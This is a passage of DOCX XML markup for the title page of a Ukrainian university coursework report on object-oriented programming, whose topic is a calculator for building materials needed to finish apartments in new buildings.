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AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Одеський</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>національний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>політехнічний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>університет</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Інститут</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>комп'ютерних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Кафедра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>інформаційних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>технологій</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00380DE3" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="130"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00380DE3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>КУРСОВА РОБОТА</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="00CE73AC" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="10" w:right="80" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>дисципліни</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Об’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>єктно-орієнтоване</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програмування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="007D0939">
      <w:pPr>
        <w:spacing w:after="27"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00F224D9" w:rsidRDefault="007D0939" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="851" w:right="1070" w:hanging="653"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Тема </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>«</w:t>
      </w:r>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Калькулятор для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>обчислення</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кількості</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необхідніх</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матеріалів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Виконання</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конкретної</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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>сфері</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будівництва</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облаштування</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> квартир </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>новобудови</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CE73AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRDefault="007D0939"/>
    <w:p w:rsidR="007D0939" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                     </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">            Студента (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">) курсу </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>групи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                         </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">                                                                                                                              </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">) </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00853AAF" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Керівник</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D0939"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Pr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t>Рудніченко</w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t>М.Д</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w: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Pr>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">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p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">(посада, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>вчене</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>звання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>науковий</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ступінь</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00853AAF" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Національна</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> шкала </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                   </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                         </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="007D0939" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
